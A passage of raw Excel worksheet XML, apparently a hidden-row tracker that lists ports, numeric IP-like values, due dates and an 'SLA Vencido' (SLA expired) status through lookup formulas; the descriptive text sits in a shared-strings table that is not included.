      </c>
      <c r="M47" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N47" s="5"/>
      <c r="O47" s="6"/>
      <c r="P47" s="6" t="s">
        <v>247</v>
      </c>
      <c r="Q47" s="6"/>
      <c r="R47" s="4">
        <v>123</v>
      </c>
      <c r="S47" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T47" s="8">
        <v>43812</v>
      </c>
      <c r="U47" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V47" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W47" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X47" s="11"/>
      <c r="Y47" s="11"/>
      <c r="Z47" s="11"/>
      <c r="AA47" s="8">
        <v>43969</v>
      </c>
      <c r="AB47" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC47" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD47" s="36"/>
      <c r="AE47" s="4"/>
      <c r="AF47" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG47" s="27"/>
      <c r="AH47" t="str">
        <f>IFERROR(VLOOKUP(H47,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="48" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A48" s="5">
        <v>47</v>
      </c>
      <c r="B48" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C48" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D48" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E48" s="4"/>
      <c r="F48" s="4"/>
      <c r="G48" s="6" t="s">
        <v>255</v>
      </c>
      <c r="H48" s="4"/>
      <c r="I48" s="4"/>
      <c r="J48" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K48" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L48" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M48" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N48" s="5"/>
      <c r="O48" s="6"/>
      <c r="P48" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q48" s="6"/>
      <c r="R48" s="4">
        <v>161</v>
      </c>
      <c r="S48" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T48" s="8">
        <v>43812</v>
      </c>
      <c r="U48" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V48" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W48" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X48" s="11"/>
      <c r="Y48" s="11"/>
      <c r="Z48" s="11"/>
      <c r="AA48" s="8"/>
      <c r="AB48" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC48" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD48" s="36"/>
      <c r="AE48" s="4"/>
      <c r="AF48" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG48" s="27"/>
      <c r="AH48" t="str">
        <f>IFERROR(VLOOKUP(H48,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="49" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A49" s="5">
        <v>48</v>
      </c>
      <c r="B49" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C49" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D49" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E49" s="4"/>
      <c r="F49" s="4"/>
      <c r="G49" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H49" s="4"/>
      <c r="I49" s="4"/>
      <c r="J49" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K49" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L49" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M49" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N49" s="4"/>
      <c r="O49" s="6"/>
      <c r="P49" s="6" t="s">
        <v>274</v>
      </c>
      <c r="Q49" s="6"/>
      <c r="R49" s="4">
        <v>161</v>
      </c>
      <c r="S49" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T49" s="8">
        <v>43812</v>
      </c>
      <c r="U49" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V49" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W49" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X49" s="11"/>
      <c r="Y49" s="11"/>
      <c r="Z49" s="11"/>
      <c r="AA49" s="8">
        <v>43969</v>
      </c>
      <c r="AB49" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC49" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD49" s="36"/>
      <c r="AE49" s="4"/>
      <c r="AF49" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG49" s="27"/>
      <c r="AH49" t="str">
        <f>IFERROR(VLOOKUP(H49,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="50" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A50" s="5">
        <v>49</v>
      </c>
      <c r="B50" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C50" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D50" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E50" s="4"/>
      <c r="F50" s="4"/>
      <c r="G50" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H50" s="4"/>
      <c r="I50" s="4"/>
      <c r="J50" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K50" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L50" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M50" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N50" s="4"/>
      <c r="O50" s="6"/>
      <c r="P50" s="6" t="s">
        <v>247</v>
      </c>
      <c r="Q50" s="6"/>
      <c r="R50" s="4">
        <v>23</v>
      </c>
      <c r="S50" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T50" s="8">
        <v>43812</v>
      </c>
      <c r="U50" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V50" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W50" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X50" s="11"/>
      <c r="Y50" s="11"/>
      <c r="Z50" s="11"/>
      <c r="AA50" s="8">
        <v>43969</v>
      </c>
      <c r="AB50" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC50" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD50" s="36"/>
      <c r="AE50" s="4"/>
      <c r="AF50" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG50" s="27"/>
      <c r="AH50" t="str">
        <f>IFERROR(VLOOKUP(H50,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="51" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A51" s="5">
        <v>50</v>
      </c>
      <c r="B51" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C51" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D51" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E51" s="4"/>
      <c r="F51" s="4"/>
      <c r="G51" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H51" s="4"/>
      <c r="I51" s="4"/>
      <c r="J51" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K51" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L51" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M51" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N51" s="4"/>
      <c r="O51" s="6"/>
      <c r="P51" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q51" s="6"/>
      <c r="R51" s="4">
        <v>123</v>
      </c>
      <c r="S51" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T51" s="8">
        <v>43812</v>
      </c>
      <c r="U51" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V51" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W51" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X51" s="11"/>
      <c r="Y51" s="11"/>
      <c r="Z51" s="11"/>
      <c r="AA51" s="8"/>
      <c r="AB51" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC51" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD51" s="36"/>
      <c r="AE51" s="4"/>
      <c r="AF51" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG51" s="27"/>
      <c r="AH51" t="str">
        <f>IFERROR(VLOOKUP(H51,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="52" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A52" s="5">
        <v>51</v>
      </c>
      <c r="B52" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C52" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D52" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E52" s="4"/>
      <c r="F52" s="4"/>
      <c r="G52" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H52" s="4"/>
      <c r="I52" s="4"/>
      <c r="J52" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K52" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L52" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M52" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N52" s="4"/>
      <c r="O52" s="6"/>
      <c r="P52" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q52" s="6"/>
      <c r="R52" s="4">
        <v>161</v>
      </c>
      <c r="S52" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T52" s="8">
        <v>43812</v>
      </c>
      <c r="U52" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V52" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W52" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X52" s="11"/>
      <c r="Y52" s="11"/>
      <c r="Z52" s="11"/>
      <c r="AA52" s="8"/>
      <c r="AB52" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC52" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD52" s="36"/>
      <c r="AE52" s="4"/>
      <c r="AF52" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG52" s="27"/>
      <c r="AH52" t="str">
        <f>IFERROR(VLOOKUP(H52,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="53" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A53" s="5">
        <v>52</v>
      </c>
      <c r="B53" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C53" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D53" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E53" s="4"/>
      <c r="F53" s="4"/>
      <c r="G53" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H53" s="4"/>
      <c r="I53" s="4"/>
      <c r="J53" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K53" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L53" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M53" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N53" s="4"/>
      <c r="O53" s="6"/>
      <c r="P53" s="6" t="s">
        <v>275</v>
      </c>
      <c r="Q53" s="6"/>
      <c r="R53" s="4">
        <v>161</v>
      </c>
      <c r="S53" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T53" s="8">
        <v>43812</v>
      </c>
      <c r="U53" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V53" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W53" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X53" s="11"/>
      <c r="Y53" s="11"/>
      <c r="Z53" s="11"/>
      <c r="AA53" s="8">
        <v>43969</v>
      </c>
      <c r="AB53" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC53" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD53" s="36"/>
      <c r="AE53" s="4"/>
      <c r="AF53" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG53" s="27"/>
      <c r="AH53" t="str">
        <f>IFERROR(VLOOKUP(H53,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="54" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A54" s="5">
        <v>53</v>
      </c>
      <c r="B54" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C54" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D54" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E54" s="4"/>
      <c r="F54" s="4"/>
      <c r="G54" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H54" s="4"/>
      <c r="I54" s="4"/>
      <c r="J54" s="4" t="s">
        <v>276</v>
      </c>
      <c r="K54" s="4" t="s">
        <v>277</v>
      </c>
      <c r="L54" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M54" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N54" s="4"/>
      <c r="O54" s="6"/>
      <c r="P54" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q54" s="6"/>
      <c r="R54" s="4">
        <v>443</v>
      </c>
      <c r="S54" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T54" s="8">
        <v>43812</v>
      </c>
      <c r="U54" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V54" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W54" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X54" s="11"/>
      <c r="Y54" s="11"/>
      <c r="Z54" s="11"/>
      <c r="AA54" s="8">
        <v>43969</v>
      </c>
      <c r="AB54" s="9" t="s">
        <v>278</v>
      </c>
      <c r="AC54" s="9" t="s">
        <v>279</v>
      </c>
      <c r="AD54" s="36"/>
      <c r="AE54" s="4"/>
      <c r="AF54" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG54" s="27"/>
      <c r="AH54" t="str">
        <f>IFERROR(VLOOKUP(H54,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="55" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A55" s="5">
        <v>54</v>
      </c>
      <c r="B55" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C55" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D55" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E55" s="4"/>
      <c r="F55" s="4"/>
      <c r="G55" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H55" s="4"/>
      <c r="I55" s="4"/>
      <c r="J55" s="4" t="s">
        <v>280</v>
      </c>
      <c r="K55" s="4" t="s">
        <v>281</v>
      </c>
      <c r="L55" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M55" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N55" s="4"/>
      <c r="O55" s="6"/>
      <c r="P55" s="6" t="s">
        <v>282</v>
      </c>
      <c r="Q55" s="6"/>
      <c r="R55" s="4">
        <v>264</v>
      </c>
      <c r="S55" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T55" s="8">
        <v>43812</v>
      </c>
      <c r="U55" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V55" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W55" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X55" s="11"/>
      <c r="Y55" s="11"/>
      <c r="Z55" s="11"/>
      <c r="AA55" s="8">
        <v>43969</v>
      </c>
      <c r="AB55" s="9" t="s">
        <v>283</v>
      </c>
      <c r="AC55" s="9" t="s">
        <v>284</v>
      </c>
      <c r="AD55" s="36"/>
      <c r="AE55" s="4"/>
      <c r="AF55" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG55" s="27"/>
      <c r="AH55" t="str">
        <f>IFERROR(VLOOKUP(H55,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="56" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A56" s="5">
        <v>55</v>
      </c>
      <c r="B56" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C56" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D56" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E56" s="4"/>
      <c r="F56" s="4"/>
      <c r="G56" s="4" t="s">
        <v>252</v>
      </c>
      <c r="H56" s="4"/>
      <c r="I56" s="4"/>
      <c r="J56" s="4" t="s">
        <v>280</v>
      </c>
      <c r="K56" s="4" t="s">
        <v>281</v>
      </c>
      <c r="L56" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M56" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N56" s="4"/>
      <c r="O56" s="6"/>
      <c r="P56" s="6" t="s">
        <v>253</v>
      </c>
      <c r="Q56" s="6"/>
      <c r="R56" s="4">
        <v>264</v>
      </c>
      <c r="S56" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T56" s="8">
        <v>43812</v>
      </c>
      <c r="U56" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V56" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W56" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X56" s="11"/>
      <c r="Y56" s="11"/>
      <c r="Z56" s="11"/>
      <c r="AA56" s="8">
        <v>44069</v>
      </c>
      <c r="AB56" s="9" t="s">
        <v>285</v>
      </c>
      <c r="AC56" s="9" t="s">
        <v>284</v>
      </c>
      <c r="AD56" s="36"/>
      <c r="AE56" s="4"/>
      <c r="AF56" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG56" s="27"/>
      <c r="AH56" t="str">
        <f>IFERROR(VLOOKUP(H56,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="57" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A57" s="5">
        <v>56</v>
      </c>
      <c r="B57" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C57" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D57" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E57" s="4"/>
      <c r="F57" s="4"/>
      <c r="G57" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H57" s="4"/>
      <c r="I57" s="4"/>
      <c r="J57" s="4" t="s">
        <v>280</v>
      </c>
      <c r="K57" s="4" t="s">
        <v>281</v>
      </c>
      <c r="L57" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M57" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N57" s="4"/>
      <c r="O57" s="6"/>
      <c r="P57" s="6" t="s">
        <v>286</v>
      </c>
      <c r="Q57" s="6"/>
      <c r="R57" s="4">
        <v>264</v>
      </c>
      <c r="S57" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T57" s="8">
        <v>43812</v>
      </c>
      <c r="U57" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V57" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W57" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X57" s="11"/>
      <c r="Y57" s="11"/>
      <c r="Z57" s="11"/>
      <c r="AA57" s="8">
        <v>43969</v>
      </c>
      <c r="AB57" s="9" t="s">
        <v>287</v>
      </c>
      <c r="AC57" s="9" t="s">
        <v>284</v>
      </c>
      <c r="AD57" s="36"/>
      <c r="AE57" s="4"/>
      <c r="AF57" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG57" s="27"/>
      <c r="AH57" t="str">
        <f>IFERROR(VLOOKUP(H57,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="58" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A58" s="5">
        <v>57</v>
      </c>
      <c r="B58" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C58" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D58" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E58" s="4"/>
      <c r="F58" s="4"/>
      <c r="G58" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H58" s="4"/>
      <c r="I58" s="4"/>
      <c r="J58" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K58" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L58" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M58" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N58" s="4"/>
      <c r="O58" s="6"/>
      <c r="P58" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q58" s="6"/>
      <c r="R58" s="4">
        <v>500</v>
      </c>
      <c r="S58" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T58" s="8">
        <v>43812</v>
      </c>
      <c r="U58" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V58" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W58" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X58" s="11"/>
      <c r="Y58" s="11"/>
      <c r="Z58" s="11"/>
      <c r="AA58" s="8"/>
      <c r="AB58" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC58" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD58" s="36"/>
      <c r="AE58" s="4"/>
      <c r="AF58" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG58" s="27"/>
      <c r="AH58" t="str">
        <f>IFERROR(VLOOKUP(H58,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="59" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A59" s="5">
        <v>58</v>
      </c>
      <c r="B59" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C59" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D59" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E59" s="4"/>
      <c r="F59" s="4"/>
      <c r="G59" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H59" s="4"/>
      <c r="I59" s="4"/>
      <c r="J59" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K59" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L59" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M59" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N59" s="4"/>
      <c r="O59" s="6"/>
      <c r="P59" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q59" s="6"/>
      <c r="R59" s="4">
        <v>500</v>
      </c>
      <c r="S59" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T59" s="8">
        <v>43812</v>
      </c>
      <c r="U59" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V59" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W59" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X59" s="11"/>
      <c r="Y59" s="11"/>
      <c r="Z59" s="11"/>
      <c r="AA59" s="8">
        <v>43969</v>
      </c>
      <c r="AB59" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC59" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD59" s="36"/>
      <c r="AE59" s="4"/>
      <c r="AF59" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG59" s="27"/>
      <c r="AH59" t="str">
        <f>IFERROR(VLOOKUP(H59,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="60" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A60" s="5">
        <v>59</v>
      </c>
      <c r="B60" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C60" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D60" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E60" s="4"/>
      <c r="F60" s="4"/>
      <c r="G60" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H60" s="4"/>
      <c r="I60" s="4"/>
      <c r="J60" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K60" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L60" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M60" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N60" s="4"/>
      <c r="O60" s="6"/>
      <c r="P60" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q60" s="6"/>
      <c r="R60" s="4">
        <v>500</v>
      </c>
      <c r="S60" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T60" s="8">
        <v>43812</v>
      </c>
      <c r="U60" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V60" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W60" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X60" s="11"/>
      <c r="Y60" s="11"/>
      <c r="Z60" s="11"/>
      <c r="AA60" s="8">
        <v>43969</v>
      </c>
      <c r="AB60" s="9" t="s">
        <v>292</v>
      </c>
      <c r="AC60" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD60" s="36"/>
      <c r="AE60" s="4"/>
      <c r="AF60" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG60" s="27"/>
      <c r="AH60" t="str">
        <f>IFERROR(VLOOKUP(H60,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="61" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A61" s="5">
        <v>60</v>
      </c>
      <c r="B61" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C61" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D61" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E61" s="4"/>
      <c r="F61" s="4"/>
      <c r="G61" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H61" s="4"/>
      <c r="I61" s="4"/>
      <c r="J61" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K61" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L61" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M61" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N61" s="4"/>
      <c r="O61" s="6"/>
      <c r="P61" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q61" s="6"/>
      <c r="R61" s="4">
        <v>500</v>
      </c>
      <c r="S61" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T61" s="8">
        <v>43812</v>
      </c>
      <c r="U61" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V61" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W61" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X61" s="11"/>
      <c r="Y61" s="11"/>
      <c r="Z61" s="11"/>
      <c r="AA61" s="8"/>
      <c r="AB61" s="9" t="s">
        <v>292</v>
      </c>
      <c r="AC61" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD61" s="36"/>
      <c r="AE61" s="4"/>
      <c r="AF61" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG61" s="27"/>
      <c r="AH61" t="str">
        <f>IFERROR(VLOOKUP(H61,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="62" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A62" s="5">
        <v>61</v>
      </c>
      <c r="B62" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C62" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D62" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E62" s="4"/>
      <c r="F62" s="4"/>
      <c r="G62" s="4" t="s">
        <v>252</v>
      </c>
      <c r="H62" s="4"/>
      <c r="I62" s="4"/>
      <c r="J62" s="4" t="s">
        <v>293</v>
      </c>
      <c r="K62" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L62" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M62" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N62" s="4"/>
      <c r="O62" s="6"/>
      <c r="P62" s="6" t="s">
        <v>253</v>
      </c>
      <c r="Q62" s="6"/>
      <c r="R62" s="4">
        <v>443</v>
      </c>
      <c r="S62" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T62" s="8">
        <v>43812</v>
      </c>
      <c r="U62" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V62" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
